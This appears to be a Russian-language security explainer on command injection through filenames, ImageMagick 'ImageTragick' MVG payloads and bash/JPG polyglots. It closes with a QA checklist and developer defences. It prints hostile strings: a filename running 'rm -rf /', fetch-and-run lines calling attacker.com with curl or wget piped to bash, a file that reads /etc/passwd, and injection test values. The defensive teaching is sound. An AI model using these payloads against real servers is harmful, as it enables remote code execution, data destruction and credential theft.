Да, **Bash-скрипты** (и любые шелл-скрипты) действительно можно внедрить в поля ввода, зашить в EXIF-метаданные картинки или в имена файлов.

Однако здесь есть фундаментальное отличие от XSS:

> **XSS (JavaScript)** исполняется на стороне **клиента** (в браузере пользователя).
> 
> **Bash-скрипты** исполняются на стороне **сервера** (Server-Side Execution), когда бэкенд развернут на Linux/Unix.

Если браузер просто проигнорирует Bash-код (для него это обычный текст), то серверный процесс, обрабатывающий загруженный файл или текст, может случайно его **выполнить**. Это приводит к уязвимостям класса **Command Injection** или **Remote Code Execution (RCE)** — самому опасному типу атак.

Ниже описаны основные сценарии, как Bash-скрипт может сработать через картинку или текстовое поле.

## 1. Внедрение Bash-кода через поля и имя файла (Command Injection)

Это происходит, когда разработчик бэкенда вызывает системные команды ОС через код (например, `Runtime.getRuntime().exec(...)` в Java, `system()` в C++ или `child_process.exec()` в Node.js), передавая туда пользовательский ввод **без экранирования**.

### Сценарий А: Имя файла как вектор атаки

Представьте, что бэкенд после загрузки аватара пытается изменить его размер с помощью консольной утилиты `ImageMagick` или `ffmpeg`:

Java

```
// Уязвимый Java-код на бэкенде:
String filename = file.getOriginalFilename(); // Имя файла берется от пользователя!
String command = "convert /uploads/" + filename + " -resize 100x100 /thumbnails/" + filename;

// Вызов консоли сервера
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
```

Если злоумышленник загружает файл и называет его:

Bash

```
image.jpg; rm -rf / # Или запускает Reverse Shell
```

Или:

Bash

```
image.jpg $(curl http://attacker.com/malicious_script.sh | bash)
```

**Результат:** Сервер выполнит команду `convert`, а символ `;` или `$()` заставит Linux-шелл выполнить второй Bash-скрипт с правами пользователя, под которым крутится Java-приложение (например, `www-data` или `appuser`).

## 2. Bash-скрипт внутри EXIF-метаданных / SVG (ImageMagick "ImageTragick")

В 2016 году в популярной библиотеке для обработки изображений `ImageMagick` нашли критическую уязвимость (CVE-2016-3714, известная как **ImageTragick**).

### Как это работало:

Пользователь загружал обычный на вид файл с расширением `.jpg` или `.png`, но внутри файла содержался код, обрабатываемый через внутренние делегаты ImageMagick (например, `MVG` или `MSL`):

Plaintext

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg" | bash -c "wget http://attacker.com/backdoor.sh -O- | bash")'
pop graphic-context
```

Когда бэкенд на Java, Python или PHP передавал этот файл в `ImageMagick` для создания миниатюры, библиотека выдергивала URL и передавала его в системный шелл, что приводило к моментальному выполнению Bash-кода на сервере.

## 3. Polyglot: Bash + JPG (Конкатенация бинарника и скрипта)

Linux-шелл считывает файл построчно. Если Bash-скрипт зашить в бинарный файл картинки, его можно сделать пригодным для исполнения.

### Как создается файл-полиглот:

Злоумышленник может склеить валидный Bash-скрипт и валидную картинку:

Bash

```
# Создаем файл, который является и картинкой, и bash-скриптом
echo '#!/bin/bash' > script.jpg
echo 'echo "Server Hacked!" && cat /etc/passwd' >> script.jpg
cat original_photo.jpg >> script.jpg
```

### Как это эксплуатируется:

Сам по себе такой файл на сервере лежать безопасно. Но атака сработает, если на сервере есть **вторая уязвимость**:

1. **LFI (Local File Inclusion):** Если уязвимый скрипт на сервере делает `include()` или заставляет интерпретатор передать путь к загруженной картинке в `/bin/bash`.
    
2. **Некорректная настройка Cron / CI/CD:** Если на сервере крутится регулярный скрипт (cron-job), который опрашивает папку `/uploads` и выполняет находящиеся там файлы:
    
    Bash
    
    ```
    # Опасный cron-скрипт на сервере:
    for file in /var/www/uploads/*; do
        bash "$file"   # Выполнит скрипт, зашитый в script.jpg!
    done
    ```
    

## Чек-лист для QA: Как тестировать защиту от Command Injection

Когда вы тестируете поля ввода (имя файла, текстовые поля, аргументы поиска) или загрузку файлов:

1. **Тестирование спецсимволов в текстовых полях и именах файлов:**
    
    Пробуйте передавать конкатенаторы команд ОС в параметрах:
    
    - `; id`
        
    - `| id`
        
    - `&& id`
        
    - `` `id` ``
        
    - `$(id)`
        
        _(Если в ответе сервера или логах появляется вывод команды `uid=1000(www-data) ...`, вы нашли RCE)._
        
2. **Загрузка файлов с нетипичными символами:**
    
    - `test.jpg; cat /etc/passwd`
        
    - `test$(sleep 5).png` _(Слепая инъекция: если сервер отвечает с задержкой в 5 секунд — команда выполнилась)._
        
3. **Как разработчики (в том числе на Java/Spring) должны защищаться:**
    
    - **Никаких `Runtime.getRuntime().exec("sh -c " + input)`!** Если нужно вызвать консольную утилиту, аргументы должны передаваться массивным видом через `ProcessBuilder("convert", param1, param2)`, где каждый аргумент экранируется автоматически.
        
    - **Генерация случайных имён файлов:** Никогда не использовать оригинальное имя файла (`file.getOriginalFilename()`) при сохранении на диск. Имя должно заменяться на `UUID.randomUUID().toString() + ".jpg"`.
        
    - **Валидация по White-list:** Разрешать только буквенно-цифровые символы и строгую проверку расширений.
